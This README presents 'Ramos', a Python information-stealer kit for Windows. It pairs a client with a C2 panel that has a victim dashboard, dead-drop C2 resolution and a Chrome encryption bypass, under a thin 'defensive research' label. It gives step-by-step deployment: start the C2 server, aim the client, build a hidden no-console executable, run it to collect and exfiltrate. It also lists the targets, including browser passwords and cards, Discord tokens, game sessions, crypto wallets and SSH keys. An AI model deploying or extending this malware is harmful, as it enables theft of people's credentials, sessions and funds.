# Ramos Info-Stealer — Python Lab Suite (Defensive Research)

A complete Windows information-stealer written in **pure Python**, built for authorized lab research: collection client, C2 panel with live dashboard, dead-drop C2 resolution, and modern Chrome App-Bound Encryption bypass. For红队 researchers, detection engineers, and students learning how this malware class works — so they can stop it.

> **Authorized lab use only.** Run the client solely on machines you own, in an isolated VM.

## Files

```
stealer/
├── stealer_client.py   the full client — every capability, fully commented
├── c2_server.py        panel + live victim dashboard
└── build_exe.bat       one-command Windows build
```

Plus `HOW_IT_WORKS.md` (technique deep-dive) and this usage guide.

## How to use

**1. Panel** — on your server:

```bash
pip install flask
sudo python3 stealer/c2_server.py --port 443
```

Dashboard: `http://<server-ip>:443/dashboard` — victims, categories, record counts, raw loot links.

**2. Aim the client** — edit the top of `stealer_client.py`:

```python
CANDIDATES = ["<your-server-ip>:443"]   # tried in order, first live C2 wins
```

Optional: set `DEADDROP_CONTRACT` / `DEADDROP_DOMAIN` for blockchain/DNS-based C2 resolution (see `HOW_IT_WORKS.md`).

**3. Build** — on Windows:

```bat
pip install pyinstaller pycryptodome pillow
pyinstaller --onefile --noconsole --name vw_client stealer_client.py
```

With the ABE engine bundled:

```bat
pyinstaller --onefile --noconsole --name vw_client --add-binary chromelevator_x64.exe:. stealer_client.py
```

(Download `chromelevator_x64.exe` from the [official ChromElevator releases](https://github.com/xaitax/Chrome-App-Bound-Encryption-Decryption/releases) — MIT licensed.)

**4. Run** — double-click `vw_client.exe` on the lab machine. No console, no args, no admin. It finds the C2, collects, exfiltrates. Watch it land in the panel.

## What it collects

| Category | Method |
|---|---|
| Chromium passwords/cookies/cards/history/bookmarks | DPAPI + ABE bypass (below) |
| Firefox logins/cookies/history | readable-at-rest stores |
| Discord tokens (plain + encrypted) | leveldb scrape, DPAPI+AED unwrap path |
| Telegram / Steam / Minecraft / Roblox | session files, DPAPI unwrap |
| Desktop wallets (7) / Web3 extensions | file + vault presence |
| SSH keys / sysinfo / screenshot | direct read |

## License

MIT — research and education. Misuse is on you.
